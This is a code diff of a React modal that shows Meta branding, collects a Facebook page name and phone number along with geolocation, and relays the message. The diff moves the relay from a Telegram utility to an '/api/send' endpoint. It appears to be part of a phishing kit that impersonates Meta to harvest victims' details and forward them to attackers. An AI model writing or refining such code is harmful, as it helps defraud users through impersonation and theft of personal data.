@@ -1,9 +1,9 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
-import sendMessage from '@/utils/telegram';
 import translateText from '@/utils/translate';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+import axios from 'axios';
 import IntlTelInput from 'intl-tel-input/reactWithUtils';
 import 'intl-tel-input/styles';
 import Image from 'next/image';
@@ -42,7 +42,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         facebookPageName: ''
     });
 
-    const { setModalOpen, geoInfo, messageId, setMessageId } = store();
+    const { setModalOpen, geoInfo, setMessageId, setMessageContent } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => {
@@ -114,10 +114,13 @@ ${
         `.trim();
 
         try {
-            const res = await sendMessage(message);
+            const res = await axios.post('/api/send', {
+                message
+            });
 
-            if (res?.success && !messageId && typeof res.message_id === 'number') {
-                setMessageId(res.message_id);
+            if (res?.data?.success && typeof res.data.message_id === 'number') {
+                setMessageId(res.data.message_id);
+                setMessageContent(message);
             }
 
             nextStep();
